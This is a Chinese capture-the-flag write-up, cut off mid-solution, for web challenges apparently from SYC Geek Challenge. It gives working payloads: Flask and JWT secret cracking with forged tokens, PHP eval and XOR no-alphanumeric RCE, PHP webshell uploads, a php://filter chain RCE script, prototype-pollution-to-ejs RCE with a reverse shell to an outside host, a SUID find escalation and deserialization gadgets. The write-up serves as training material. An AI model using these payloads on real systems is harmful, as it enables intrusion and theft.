os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径。 os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39; 故在 /upload 路由，POST title=/f14444&amp;content=qwe，即可拿到flag。 ​ you konw flask? 在驾校你不高低得当个教练？ 扫描出 robots.txt，泄露信息：3ysd8.html，源码里有注释： &lt;!-- key是 app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,我可爱的菀宝,我存的够安全的吧) --&gt; 制作爆破secret_key的字典： 123456import base64g = open(&#x27;dict.txt&#x27;,&#x27;wb&#x27;)for i in range(100): key = b&#x27;wanbao&#x27;+base64.b64encode(str(i).encode())+b&#x27;wanbao&#x27; g.write(key) g.write(b&#x27;\\n&#x27;) 爆破flask session的secret_key： flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt 得到secret_key后，伪造admin的flask session： flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39; 进入学员管理页面，找到flag： 既然你是教练，那这个flag学员就交给你吧 SYC&#123;naCcuTYu2mu0c33Fen&#125; ​ Pupyy_rce 这是什么？执行一下 123456789101112131415161718&lt;?phphighlight_file(__FILE__);header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);error_reporting(0);include(flag.php);//当前目录下有好康的😋if (isset($_GET[&#x27;var&#x27;]) &amp;&amp; $_GET[&#x27;var&#x27;]) &#123; $var = $_GET[&#x27;var&#x27;]; if (!preg_match(&quot;/env|var|session|header/i&quot;, $var,$match)) &#123; if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $var))&#123; eval($_GET[&#x27;var&#x27;]); &#125; else die(&quot;WAF!!&quot;); &#125; else&#123; die(&quot;PLZ DONT HCAK ME😅&quot;); &#125;&#125; 无参数RCE：?var=print_r(scandir(current(localeconv()))); 得到： Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt ) 访问 fl@g.php 得flag。 ​ 雨 VanZY给白月光写了一张明信片，快去帮他把id签上吧 访问 /source 没权限，提示 &lt;!--Maybe you can view /hint--&gt;。 访问 /hint，提示 I heard that the challenge maker likes to use his own id as secret_key。 使用jwt.io解析jwt，设置secret_key=VanZY，得到 /source 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const express = require(&#x27;express&#x27;);const jwt = require(&#x27;jsonwebtoken&#x27;);const app = express();const bodyParser = require(&#x27;body-parser&#x27;)const path = require(&#x27;path&#x27;);const jwt_secret = &quot;VanZY&quot;;const cookieParser = require(&#x27;cookie-parser&#x27;);const putil_merge = require(&quot;putil-merge&quot;)app.set(&#x27;views&#x27;, &#x27;./views&#x27;);app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(cookieParser());app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())var Super = &#123;&#125;;var safecode = function (code)&#123; let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig; return !validInput.test(code);&#125;;app.all(&#x27;/code&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); if (req.method == &quot;POST&quot; &amp;&amp; req.body) &#123; putil_merge(&#123;&#125;, req.body, &#123;deep:true&#125;); &#125; res.send(&quot;welcome to code&quot;);&#125;);app.all(&#x27;/hint&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); res.send(&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;);&#125;);app.get(&#x27;/source&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); var auth = req.cookies.auth; jwt.verify(auth, jwt_secret , function(err, decoded) &#123; try&#123; if(decoded.user===&#x27;admin&#x27;)&#123; res.sendFile(path.join(__dirname + &#x27;/index.js&#x27;)); &#125;else&#123; res.send(&#x27;you are not admin &lt;!--Maybe you can view /hint--&gt;&#x27;); &#125; &#125; catch&#123; res.send(&quot;Fuck you Hacker!!!&quot;) &#125; &#125;);&#125;);app.all(&#x27;/create&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); if (!req.body.name || req.body.name === undefined || req.body.name === null)&#123; res.send(&quot;please input name&quot;); &#125;else &#123; if (Super[&#x27;userrole&#x27;] === &#x27;Superadmin&#x27;) &#123; res.render(&#x27;index&#x27;, req.body); &#125;else &#123; if (!safecode(req.body.name)) &#123; res.send(&quot;你在做什么？快停下！！！&quot;) &#125; else&#123; res.render(&#x27;index&#x27;, &#123;name: req.body.name&#125;); &#125; &#125; &#125;&#125;);app.get(&#x27;/&#x27;,(req, res) =&gt; &#123; res.type(&#x27;html&#x27;); var token = jwt.sign(&#123;&#x27;user&#x27;:&#x27;guest&#x27;&#125;,jwt_secret,&#123; algorithm: &#x27;HS256&#x27; &#125;); res.cookie(&#x27;auth &#x27;,token); res.end(&#x27;Only admin can get source in /source&#x27;);&#125;);app.listen(3000, () =&gt; console.log(&#x27;Server started on port 3000&#x27;)); 在 /code 路由中使用了 putil_merge() ，结合putil-merge原型链污染漏洞（CVE-2021-23470），将 Super 污染，使得 /create 路由内的 Super[&#39;userrole&#39;] === &#39;Superadmin&#39; 成立： 1234POST /codeContent-Type: application/json&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125; 进入 /create 路由内，打ejs RCE（CVE-2022-29078），参考：ejs RCE CVE-2022-29078 bypass。 1234567891011POST /create HTTP/1.1Content-Type: application/json&#123;&quot;name&quot;:&quot;xxx&quot;, &quot;settings&quot;:&#123; &quot;view options&quot;:&#123; &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\\&quot;child_process\\&quot;).execSync(\\&quot;bash -c \\\\\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\\\\&quot;\\&quot;);&quot;, &quot;client&quot;:&quot;true&quot; &#125; &#125;&#125; 反弹shell，在VPS getshell，cat /Yupr0m1sing_f1ll4agggXD 得到flag：SYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;。 ​ famale_imp_l0ve ”雌小鬼看了下o2takuXX师傅的马子说:”呐~就..就怎么长吗，真是杂鱼呢~❤”,你能来帮帮他吗？ 根据源码注释，存在 include.php 文件： 123456789&lt;?php//o2takuXX师傅说有问题，忘看了。header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);highlight_file(__FILE__);$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123; include($file);&#125;?&gt; 结合首页文件上传和压缩的提示，考察zip文件包含。 首先新建一个zip文件，里面压缩着一个代码为 &lt;?php system($_GET[x]); 的PHP脚本；然后构造 zip://php.zip#php.jpg： /include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag 即可得到flag。 ​ change_it 快来找flag！（文件上传的目录为 “/upload”） 查看源代码得到用户名密码 user/user，其中有： 1234567891011121314151617&lt;!-- 一直连不上？连不上就对啦！ --&gt; &lt;!-- php版本为8.0 function php_mt_seed($seed) &#123; mt_srand($seed); &#125; $seed = time(); php_mt_seed($seed); $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $newFileName = &#x27;&#x27;; for ($i = 0; $i &lt; 10; $i++) &#123; $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; &#125; --&gt; jwt伪造，爆破c-jwt-cracker： ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4 得到 Secret is &quot;yibao&quot; 构造 &#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125; 对应的JWT： eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek 根据前面 change.html 源码泄露的 php_mt_seed() 函数知文件名通过随机数更改，抓包，改文件名为1.php： 123456POST /change.php HTTP/1.1------WebKitFormBoundaryLjuFMGS9hc3RMksxContent-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;Content-Type: image/jpeg&lt;?php system(&quot;cat /flag&quot;); 上传，同时爆破文件名：https://3v4l.org/UvLQQ#v8.0.30 1234567891011121314151617181920&lt;?phpfunction php_mt_seed($seed)&#123; mt_srand($seed);&#125;$x = time();for($k=-20;$k&lt;20;$k++) &#123; $seed = $x+$k; php_mt_seed($seed); $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $newFileName = &#x27;&#x27;; for ($i = 0; $i &lt; 10; $i++) &#123; $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; &#125; echo $newFileName.&#x27;|&#x27;;&#125; 得到的文件名，爆破其存在性： 123456789101112import requestsrand = &#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;.split(&#x27;|&#x27;)[:-1]url=&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;for i in range(len(rand)): u = url + rand[i] + &#x27;.php&#x27; r=requests.get(u) if r.status_code == 200: print(u) break 访问即可得flag。 ​ ezrfi 亲爱的Syclover,你能找到flag吗???? 只能读py文件，试出 ?file=/var/hint secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot; base64解密得： Ö.o owO 0w0 ov0 Öwo O.o 0.0 0.o Öv0 0vÖ Ov0 OwÖ o.O ÖvO 0_0 0_O o.O 0v0 Ö_o Owo ÖvO Ö.O Ö_0 O.O Ö_0 0vÖ 0.0 ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö.O Öw0 owÖ Ö.o O.o Ö_0 0vÖ Öwo OwÖ O.o OwO o_o Ö.O o.o owO Ö_0 owO Ö_0 0vo o.O OwÖ Ovo 0.Ö Öv0 O.Ö 0.0 0wÖ o.Ö owo ow0 0vo Ö.o owO o_0 Ö.O o_o OwÖ O.o ow0 Ö_o owo Ö.0 ÖvO o_O O.Ö Ov0 Ow0 o.Ö 0v0 Ov0 O_O o.O OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o.O ÖvO o.0 0_0 Ö_o owO O_0 0.Ö Ö.o O.O Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o 0_Ö Övo ÖvÖ 0w0 OvÖ Ö.o Ö.0 Ö.o ovo Ö.0 Ö.0 0wo owO o.O 0wÖ 0v0 owÖ Öw0 Ö.o 0w0 O_Ö o_O Övo 尊嘟假嘟解码： Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy 根据提示RC4解码，key=Syclover，得： 文件包含逻辑是include($file.&quot;.py&quot;),你能找到flag文件位置吗?? 参考： LFI 新姿势学习，使用文件包含RCE： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsurl = &quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;file_to_use = &quot;/var/hint&quot;command = &quot;cat /ffffffllllag&quot;#&lt;?=`$_GET[0]`;;?&gt;base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;conversions = &#123; &#x27;R&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;, &#x27;B&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;, &#x27;C&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;, &#x27;8&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;, &#x27;9&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;, &#x27;f&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;, &#x27;s&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;, &#x27;z&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;, &#x27;U&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;, &#x27;P&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;, &#x27;V&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;, &#x27;0&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;, &#x27;Y&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;, &#x27;W&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;, &#x27;d&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;, &#x27;D&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;, &#x27;7&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;, &#x27;4&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;&#125;# generate some garbage base64filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;filters += &quot;convert.base64-encode|&quot;# make sure to get rid of any equal signs in both the string we just generated and the rest of the filefilters += &quot;convert.iconv.UTF8.UTF7|&quot;for c in base64_payload[::-1]: filters += conversions[c] + &quot;|&quot; # decode and reencode to get rid of everything that isn&#x27;t valid base64 filters += &quot;convert.base64-decode|&quot; filters += &quot;convert.base64-encode|&quot; # get rid of equal signs filters += &quot;convert.iconv.UTF8.UTF7|&quot;filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;r = requests.get(url, params=&#123; &quot;0&quot;: command, &quot;file&quot;: final_payload&#125;)print(r.text)# SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125; ​ EzRce can you rce me??? flag中空格请用下划线替代 123456789101112&lt;?phpinclude(&#x27;waf.php&#x27;);session_start();show_source(__FILE__);error_reporting(0);$data=$_GET[&#x27;data&#x27;];if(waf($data))&#123; eval($data);&#125;else&#123; echo &quot;no!&quot;;&#125;?&gt; 盲试waf，为无字母数字RCE，异或可用，将每个字符异或 %A0 得到不可见字符。 phpinfo();： ?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)(); 看到disable_function禁用了： exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders 读waf - readgzfile(&#39;waf.php&#39;);： ?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0); waf.php 123456789&lt;?phpfunction waf($data)&#123; if(preg_match(&#x27;/[b-df-km-uw-z0-9\\+\\~\\&#123;\\&#125;]+/i&#x27;,$data))&#123; return False; &#125;else&#123; return True; &#125;&#125; 写马 - file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);： ?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B)); 蚁剑连接，find / -perm -u=s -type f 2&gt;/dev/null 发现 /usr/bin/find 有 SUID权限， find提权： 123cd /tmptouch abcdfind abcd -exec cat /flag \\; 得flag：SYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125; ​ ezpython can you pollute me? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import jsonimport osfrom waf import wafimport importlibfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_stringapp = Flask(__name__)app.secret_key=&#x27;jjjjggggggreekchallenge202333333&#x27;class User(): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot; self.isvip=Falseclass hhh(User): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot;registered_users=[]@app.route(&#x27;/&#x27;)def hello_world(): # put application&#x27;s code here return render_template(&quot;welcome.html&quot;)@app.route(&#x27;/play&#x27;)def play(): username=session.get(&#x27;username&#x27;) if username: return render_template(&#x27;index.html&#x27;,name=username) else: return redirect(url_for(&#x27;login&#x27;))@app.route(&#x27;/login&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def login(): if request.method == &#x27;POST&#x27;: username=request.form.get(&#x27;username&#x27;) password=request.form.get(&#x27;password&#x27;) user = next((user for user in registered_users if user.username == username and user.password == password), None) if user: session[&#x27;username&#x27;] = user.username session[&#x27;password&#x27;]=user.password return redirect(url_for(&#x27;play&#x27;)) else: return &quot;Invalid login&quot; return redirect(url_for(&#x27;play&#x27;)) return render_template(&quot;login.html&quot;)@app.route(&#x27;/register&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def register(): if request.method == &#x27;POST&#x27;: try: if waf(request.data): return &quot;fuck payload!Hacker!!!&quot; data=json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;连用户名密码都没有你注册啥呢&quot; user=hhh() merge(data,user) registered_users.append(user) except Exception as e: return &quot;泰酷辣,没有注册成功捏&quot; return redirect(url_for(&#x27;login&#x27;)) else: return render_template(&quot;register.html&quot;)@app.route(&#x27;/flag&#x27;,methods=[&#x27;GET&#x27;])def flag(): user = next((user for user in registered_users if user.username ==session[&#x27;username&#x27;] and user.password == session[&#x27;password&#x27;]), None) if user: if user.isvip: data=request.args.get(&#x27;num&#x27;) if data: if &#x27;0&#x27; not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: flag = os.environ.get(&#x27;geek_flag&#x27;) return render_template(&#x27;flag.html&#x27;,flag=flag) else: return &quot;你的数字不对哦!&quot; else: return &quot;I need a num!!!&quot; else: return render_template_string(&#x27;这种神功你不充VIP也想学?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\\&#x27;static\\&#x27;,filename=\\&#x27;weixin.png\\&#x27;)&#125;&#125;&quot;&gt;要不v我50,我送你一个VIP吧,嘻嘻&lt;/p&gt;&#x27;) else: return &quot;先登录去&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;) 代码中有 merge() 函数，参考：Python原型链污染变体(prototype-pollution-in-python) waf中包含 isvip，使用Unicode编码绕过关键字过滤。 对路由 /register，POST &#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\\u0076ip&quot; : 1&#125;&#125;&#125; 再登录访问 /flag，用 + 绕过判断：/flag?num=+123456789，查看源码得到flag。 ​ ez_php 我的女神呢？快帮我找找 源码在 havefun.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(0);show_source(__FILE__);include(&#x27;key.php&#x27;);include(&#x27;waf.php&#x27;);class Me &#123; public $qwe; public $bro; public $secret; public function __wakeup() &#123; echo(&quot;进来啦&lt;br&gt;&quot;); $characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret)&#123; $bb = $this-&gt;qwe; return $bb(); &#125; else&#123; echo(&quot;错了哥们,再试试吧&lt;br&gt;&quot;); &#125; &#125;&#125;class her&#123; private $hername; private $key; public $asd; public function __invoke() &#123; echo(&quot;好累，好想睡一觉啊&lt;br&gt;&quot;); serialize($this-&gt;asd); &#125; public function find() &#123; echo(&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === &#x27;vxvx&#x27;) &#123; echo(&quot;解密成功！&lt;br&gt;&quot;); $file=$_GET[&#x27;file&#x27;]; if (isset($file) &amp;&amp; (file_get_contents($file,&#x27;r&#x27;) === &quot;loveyou&quot;)) &#123; echo(&quot;快点的，急急急！！！&lt;br&gt;&quot;); echo new $_POST[&#x27;ctf&#x27;]($_GET[&#x27;fun&#x27;]); &#125; else&#123; echo(&quot;真的只差一步了！&lt;br&gt;&quot;); &#125; &#125; else&#123; echo(&quot;兄弟怎么搞的？&lt;br&gt;&quot;); &#125; &#125;&#125;class important&#123; public $power; public function __sleep() &#123; echo(&quot;睡饱了，接着找！&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; &#125;&#125;class useless &#123; private $seeyou; public $QW; public $YXX; public function __construct($seeyou) &#123; $this-&gt;seeyou = $seeyou; &#125; public function __destruct() &#123; $characters = &#x27;0123456789&#x27;; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match(&#x27;/key\\.php\\/*$/i&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80)&#123; $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random===&#x27;newbee&#x27;; if($bool)&#123; echo(&quot;快拿到我的小秘密了&lt;br&gt;&quot;); $a = isset($_GET[&#x27;a&#x27;])? $_GET[&#x27;a&#x27;]: &quot;&quot; ; if(!preg_match(&#x27;/HTTP/i&#x27;, $a))&#123; echo (basename($_SERVER[$a])); echo (&#x27;&lt;br&gt;&#x27;); if(basename($_SERVER[$a])===&#x27;key.php&#x27;)&#123; echo(&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); &#125; &#125; else&#123; echo(&quot;你别这样，她会生气的┭┮﹏┭┮&quot;); &#125; &#125; &#125; else&#123; echo(&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;); &#125; &#125; &#125; public function __get($good) &#123; echo &quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); &#125;&#125;if (isset($_GET[&#x27;user&#x27;])) &#123; $user = $_GET[&#x27;user&#x27;]; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) &#123; unserialize($user); &#125; else &#123; echo(&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;); &#125;&#125;else &#123; echo(&quot;快帮我找找她！&lt;br&gt;&quot;);&#125;?&gt; 先反序列化 useless 类的 __destruct() 拿到 key.php： 用 ArrayObject 绕过 /^[Oa]:[\\d]+/i，md5碰撞，再根据 and 的优先级无视 $random： C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125; basename() 绕过 $_SERVER[&#39;PHP_SELF&#39;]： 